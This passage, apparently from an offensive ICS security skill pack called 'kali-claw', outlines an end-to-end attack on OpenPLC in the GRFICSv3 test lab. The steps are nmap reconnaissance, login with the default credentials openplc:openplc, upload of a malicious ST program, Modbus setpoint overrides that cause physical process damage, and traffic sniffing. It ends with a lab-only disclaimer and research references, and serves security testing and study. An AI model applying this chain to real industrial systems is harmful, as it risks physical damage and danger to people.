**防御建议**：Web HMI 前置反向代理（nginx）隐藏 Server header；定期升级 Werkzeug + Python。

### 21.5 完整攻击链（v0.2.5.1 验证）

针对 OpenPLC 部署的端到端攻击链（CVSS 累积评分 10.0）：

```
1. nmap 侦察 → 发现 502 (Modbus) + 8080 (Werkzeug) [V7 信息泄漏]
       ↓
2. openplc:openplc 登录 Web HMI [V8 默认凭据 CVSS 9.8]
       ↓
3. 从 dashboard 上传恶意 ST 程序 [V2 远程代码加载]
       ↓
4. 或直接 Modbus 写 HR (setpoint override) [V2 动力学 CVSS 10.0]
       ↓
5. tcpdump 被动嗅探长期捕获凭据/数据 [V4 无加密 CVSS 7.5]
```

**单点最高 CVSS**：10.0（远程匿名设定值修改 → 物理工艺损坏）

### 21.6 验证参考

- **完整验证指南**：`guides/validation-walkthrough-zh.md`（500 行，10 章）
- **复现步骤**：`evidence/2026-08-10/grficsv3-reproduction-recipe.md`
- **GRFICSv3 靶场**：https://github.com/Fortiphyd/GRFICSv3
- **OpenPLC 项目**：https://www.openplcproject.com/

---

## Attribution and References

All commands and techniques documented here are for **authorized lab environments only**. Real-world testing requires:

- Written authorization from facility owner
- Identification of SIS exclusion zones
- Operator presence during all active testing
- Documented emergency procedures

Key references for fieldbus attack research:

- **Dragos** — ICS threat intelligence, Industroyer/CrashOverride analysis
- **Claroty, Nozomi, Tenable.ot** — Research blogs on fieldbus vulnerabilities
- **Mandiant / FireEye** — Triton/Trisis detailed analysis
- **SANS ICS** — Annual summit presentations on fieldbus attacks
- **SCADA StrangeLove** — Russian ICS research team publications
- **F-Secure** — Ukraine 2015 BlackEnergy incident report
- **US-CERT ICS-CERT** — Vendor advisories and CVE database
- **IEEE** — Industrial cyber security standards and research

This file is part of the kali-claw `ics-fieldbus-attack` skill. See `SKILL.md` for methodology and `guides/ics-fieldbus-attack-playbook.md` for the comprehensive playbook.
